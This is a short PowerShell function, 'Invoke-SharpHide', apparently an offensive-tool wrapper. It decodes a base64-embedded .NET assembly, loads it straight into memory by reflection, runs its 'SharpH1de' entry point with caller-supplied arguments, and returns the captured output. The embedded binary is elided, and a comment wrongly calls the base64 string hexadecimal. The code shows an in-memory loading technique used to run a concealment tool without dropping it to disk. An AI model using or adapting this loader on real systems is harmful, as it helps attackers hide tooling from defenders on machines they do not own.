function Invoke-SharpHide
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = ""
    )
    $base64binary="TVq...AAA"# The omitted "TVq...AAA" is actually a 12289 character long hexadecimal string.
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [SharpH1de.Program]::main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
